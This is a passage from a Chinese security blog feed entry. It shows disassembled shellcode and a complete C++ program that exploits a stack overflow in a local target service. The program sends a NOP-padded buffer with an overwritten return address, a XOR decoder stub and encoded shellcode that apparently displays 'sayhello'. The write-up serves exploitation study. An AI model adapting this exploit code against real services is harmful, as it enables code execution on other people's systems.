edi</span><br><span class="line">mov esi,dword ptr ds:[ebx+edi*4]</span><br><span class="line">add esi,ebp</span><br><span class="line">cdq</span><br><span class="line">movsx eax,byte ptr ds:[esi]</span><br><span class="line">cmp al,ah</span><br><span class="line">je short 0012FC40</span><br><span class="line">ror edx,0x7</span><br><span class="line">add edx,eax                              ; exploit_.00409A68</span><br><span class="line">inc esi</span><br><span class="line">jmp short 0012FC31</span><br><span class="line">cmp edx,dword ptr ss:[esp+0x1C]</span><br><span class="line">jnz short 0012FC2A</span><br><span class="line">mov ebx,dword ptr ds:[ecx+0x24]</span><br><span class="line">add ebx,ebp</span><br><span class="line">mov di,word ptr ds:[ebx+edi*2]</span><br><span class="line">mov ebx,dword ptr ds:[ecx+0x1C]</span><br><span class="line">add ebx,ebp</span><br><span class="line">add ebp,dword ptr ds:[ebx+edi*4]</span><br><span class="line">xchg eax,ebp</span><br><span class="line">pop edi                                  ; ws2_32.71A2F8FD</span><br><span class="line">stos dword ptr es:[edi]</span><br><span class="line">push edi</span><br><span class="line">popad</span><br><span class="line">cmp eax,0x1E380A6A</span><br><span class="line">jnz short 0012FC0C</span><br><span class="line">xor ebx,ebx</span><br><span class="line">push ebx</span><br><span class="line">push 0x6F6C6C65</span><br><span class="line">push 0x68796173</span><br><span class="line">mov eax,esp</span><br><span class="line">push ebx</span><br><span class="line">push eax                                 ; exploit_.00409A68</span><br><span class="line">push eax                                 ; exploit_.00409A68</span><br><span class="line">push ebx</span><br><span class="line">call dword ptr ds:[edi-0x4]</span><br><span class="line">push ebx</span><br><span class="line">call dword ptr ds:[edi-0x8]</span><br></pre></td></tr></table></figure><p>为了避免截断，使用亦或加密为不会产生阶段机器码的二进制。</p><h1>实现exploit程序</h1><p>使用的是VC6.0的环境，在xp下测试通过</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Winsock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">&quot;Ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">SocketStartup</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">WORD wVersionRequested;</span><br><span class="line">WSADATA wsaData;</span><br><span class="line"><span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">wVersionRequested = <span class="built_in">MAKEWORD</span>( <span class="number">2</span>, <span class="number">2</span> );</span><br><span class="line"></span><br><span class="line">err = <span class="built_in">WSAStartup</span>( wVersionRequested, &amp;wsaData );</span><br><span class="line"><span class="keyword">if</span> ( err != <span class="number">0</span> ) &#123;</span><br><span class="line"><span class="comment">/* Tell the user that we could not find a usable */</span></span><br><span class="line"><span class="comment">/* WinSock DLL.                                  */</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Confirm that the WinSock DLL supports 2.2.*/</span></span><br><span class="line"><span class="comment">/* Note that if the DLL supports versions greater    */</span></span><br><span class="line"><span class="comment">/* than 2.2 in addition to 2.2, it will still return */</span></span><br><span class="line"><span class="comment">/* 2.2 in wVersion since that is the version we      */</span></span><br><span class="line"><span class="comment">/* requested.                                        */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( <span class="built_in">LOBYTE</span>( wsaData.wVersion ) != <span class="number">2</span> ||</span><br><span class="line">        <span class="built_in">HIBYTE</span>( wsaData.wVersion ) != <span class="number">2</span> ) &#123;</span><br><span class="line"><span class="comment">/* Tell the user that we could not find a usable */</span></span><br><span class="line"><span class="comment">/* WinSock DLL.                                  */</span></span><br><span class="line"><span class="built_in">WSACleanup</span>( );</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUF_MAX_SIZE (0xC8 + 17 + 176 + 4)</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> szBuf[BUF_MAX_SIZE] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="built_in">memset</span>(szBuf, <span class="number">0x90</span>, BUF_MAX_SIZE);</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> decode_data[<span class="number">17</span>] = &#123;</span><br><span class="line"><span class="number">0x33</span>, <span class="number">0xC9</span>, <span class="number">0xB1</span>, <span class="number">0xC8</span>, <span class="number">0x8B</span>, <span class="number">0xFC</span>, <span class="number">0x83</span>, <span class="number">0xC7</span>, <span class="number">0x15</span>, <span class="number">0x80</span>, <span class="number">0x37</span>, <span class="number">0x8C</span>, <span class="number">0x47</span>, <span class="number">0xFE</span>, <span class="number">0xC9</span>, <span class="number">0x75</span>, </span><br><span class="line"><span class="number">0xF8</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> encode_data[<span class="number">176</span>] = &#123;</span><br><span class="line"><span class="number">0x70</span>, <span class="number">0xE4</span>, <span class="number">0xE6</span>, <span class="number">0x86</span>, <span class="number">0xB4</span>, <span class="number">0x92</span>, <span class="number">0xE4</span>, <span class="number">0xEF</span>, <span class="number">0x05</span>, <span class="number">0x5D</span>, <span class="number">0xC3</span>, <span class="number">0xE4</span>, <span class="number">0xBE</span>, <span class="number">0xF8</span>, <span class="number">0x1D</span>, <span class="number">0x80</span>, </span><br><span class="line"><span class="number">0x07</span>, <span class="number">0x78</span>, <span class="number">0x01</span>, <span class="number">0xF2</span>, <span class="number">0x78</span>, <span class="number">0xBF</span>, <span class="number">0x57</span>, <span class="number">0x3B</span>, <span class="number">0x88</span>, <span class="number">0xA7</span>, <span class="number">0x6F</span>, <span class="number">0xEA</span>, <span class="number">0x37</span>, <span class="number">0xBF</span>, <span class="number">0xBE</span>, <span class="number">0xDF</span>, </span><br><span class="line"><span class="number">0xE4</span>, <span class="number">0xF9</span>, <span class="number">0xFF</span>, <span class="number">0xE9</span>, <span class="number">0xFE</span>, <span class="number">0xD8</span>, <span class="number">0xBF</span>, <span class="number">0x5E</span>, <span class="number">0xE8</span>, <span class="number">0x07</span>, <span class="number">0x91</span>, <span class="number">0x94</span>, <span class="number">0x8C</span>, <span class="number">0x8C</span>, <span class="number">0x8C</span>, <span class="number">0x07</span>, </span><br><span class="line"><span class="number">0xD7</span>, <span class="number">0xBC</span>, <span class="number">0x07</span>, <span class="number">0xD7</span>, <span class="number">0x80</span>, <span class="number">0x07</span>, <span class="number">0xD7</span>, <span class="number">0x80</span>, <span class="number">0x07</span>, <span class="number">0x97</span>, <span class="number">0x07</span>, <span class="number">0x97</span>, <span class="number">0x07</span>, <span class="number">0xE7</span>, <span class="number">0x94</span>, <span class="number">0x21</span>, </span><br><span class="line"><span class="number">0xB1</span>, <span class="number">0xE6</span>, <span class="number">0x86</span>, <span class="number">0xB4</span>, <span class="number">0x92</span>, <span class="number">0xF9</span>, <span class="number">0x89</span>, <span class="number">0x19</span>, <span class="number">0x73</span>, <span class="number">0xDB</span>, <span class="number">0x74</span>, <span class="number">0x19</span>, <span class="number">0xEC</span>, <span class="number">0x07</span>, <span class="number">0xC9</span>, <span class="number">0xB0</span>, </span><br><span class="line"><span class="number">0x07</span>, <span class="number">0xC0</span>, <span class="number">0x89</span>, <span class="number">0xF4</span>, <span class="number">0x8F</span>, <span class="number">0x41</span>, <span class="number">0x07</span>, <span class="number">0xD5</span>, <span class="number">0xAC</span>, <span class="number">0x8F</span>, <span class="number">0x51</span>, <span class="number">0xBF</span>, <span class="number">0x73</span>, <span class="number">0xCB</span>, <span class="number">0x07</span>, <span class="number">0xB8</span>, </span><br><span class="line"><span class="number">0x37</span>, <span class="number">0x8F</span>, <span class="number">0x79</span>, <span class="number">0x15</span>, <span class="number">0x83</span>, <span class="number">0x32</span>, <span class="number">0x8A</span>, <span class="number">0xB6</span>, <span class="number">0x48</span>, <span class="number">0xF8</span>, <span class="number">0x84</span>, <span class="number">0x4D</span>, <span class="number">0x46</span>, <span class="number">0x8B</span>, <span class="number">0x8F</span>, <span class="number">0x5C</span>, </span><br><span class="line"><span class="number">0xCA</span>, <span class="number">0x67</span>, <span class="number">0x7D</span>, <span class="number">0xB7</span>, <span class="number">0xD8</span>, <span class="number">0xA8</span>, <span class="number">0x90</span>, <span class="number">0xF9</span>, <span class="number">0x68</span>, <span class="number">0x07</span>, <span class="number">0xD5</span>, <span class="number">0xA8</span>, <span class="number">0x8F</span>, <span class="number">0x51</span>, <span class="number">0xEA</span>, <span class="number">0x07</span>, </span><br><span class="line"><span class="number">0xB0</span>, <span class="number">0xF7</span>, <span class="number">0x07</span>, <span class="number">0xD5</span>, <span class="number">0x90</span>, <span class="number">0x8F</span>, <span class="number">0x51</span>, <span class="number">0x8F</span>, <span class="number">0xA0</span>, <span class="number">0x37</span>, <span class="number">0x19</span>, <span class="number">0xD3</span>, <span class="number">0x27</span>, <span class="number">0xDB</span>, <span class="number">0xED</span>, <span class="number">0xB1</span>, </span><br><span class="line"><span class="number">0xE6</span>, <span class="number">0x86</span>, <span class="number">0xB4</span>, <span class="number">0x92</span>, <span class="number">0xF9</span>, <span class="number">0x25</span>, <span class="number">0xBF</span>, <span class="number">0x57</span>, <span class="number">0xDF</span>, <span class="number">0xE4</span>, <span class="number">0xE9</span>, <span class="number">0xE0</span>, <span class="number">0xE0</span>, <span class="number">0xE3</span>, <span class="number">0xE4</span>, <span class="number">0xFF</span>, </span><br><span class="line"><span class="number">0xED</span>, <span class="number">0xF5</span>, <span class="number">0xE4</span>, <span class="number">0x07</span>, <span class="number">0x48</span>, <span class="number">0xDF</span>, <span class="number">0xDC</span>, <span class="number">0xDC</span>, <span class="number">0xDF</span>, <span class="number">0x73</span>, <span class="number">0xDB</span>, <span class="number">0x70</span>, <span class="number">0xDF</span>, <span class="number">0x73</span>, <span class="number">0xDB</span>, <span class="number">0x74</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">memcpy</span>(&amp;szBuf[<span class="number">0xC8</span> + <span class="number">4</span>], decode_data, <span class="number">17</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(&amp;szBuf[<span class="number">0xC8</span> + <span class="number">4</span> + <span class="number">17</span>], encode_data, <span class="number">176</span>);</span><br><span class="line">*(<span class="keyword">int</span> *)&amp;szBuf[<span class="number">0xC8</span>] = <span class="number">0x71A2F8FB</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">SocketStartup</span>() == <span class="literal">false</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">SOCKET fdSock = <span class="built_in">socket</span>(AF_INET, SOCK_STREAM, IPPROTO_IP);</span><br><span class="line"><span class="keyword">if</span> (fdSock == INVALID_SOCKET)</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;create socket descriptor failed&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sockaddr_in stSockAddr = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">stSockAddr.sin_family = AF_INET;</span><br><span class="line">stSockAddr.sin_port = <span class="built_in">htons</span>(<span class="number">0x1E61</span>);</span><br><span class="line">stSockAddr.sin_addr.s_addr = <span class="built_in">inet_addr</span>(<span class="string">&quot;127.0.0.1&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">connect</span>(fdSock, (sockaddr*)&amp;stSockAddr, <span class="built_in"><span class="keyword">sizeof</span></span>(stSockAddr)) == SOCKET_ERROR)</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;connect failed&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line"><span class="built_in">closesocket</span>(fdSock);</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">send</span>(fdSock, szBuf, BUF_MAX_SIZE, <span class="number">0</span>) == SOCKET_ERROR)</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;send failed&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line"><span class="built_in">shutdown</span>(fdSock, SD_SEND);</span><br><span class="line"><span class="built_in">closesocket</span>(fdSock);</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;utilize success&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line"><span class="built_in">shutdown</span>(fdSock, SD_SEND);</span><br><span class="line"><span class="built_in">closesocket</span>(fdSock);</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>效果截图：</p><p><img src="https://cdn.jsdelivr.net/gh/m-Onst/pics@main/blog/202104/20210406202539.png" alt=""></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;分析目标程序&lt;/h1&gt;
&lt;h2 id=&quot;分析大体流程&quot;&gt;分析大体流程&lt;/h2&gt;
&lt;p&gt;使用IDA打开，分析下这个程序的具体功能：&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;</summary>
      
    
    
    
    <category term="shellcode在漏洞利用中的应用" scheme="https://4st.tech/categories/shellcode%E5%9C%A8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/"/>
    
    <category term="栈溢出" scheme="https://4st.tech/categories/shellcode%E5%9C%A8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    
    
    <category term="逆向" scheme="https://4st.tech/tags/%E9%80%86%E5%90%91/"/>
    
    <category term="shellcode" scheme="https://4st.tech/tags/shellcode/"/>
    
    <category term="漏洞利用" scheme="https://4st.tech/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
  </entry>
  
</feed>
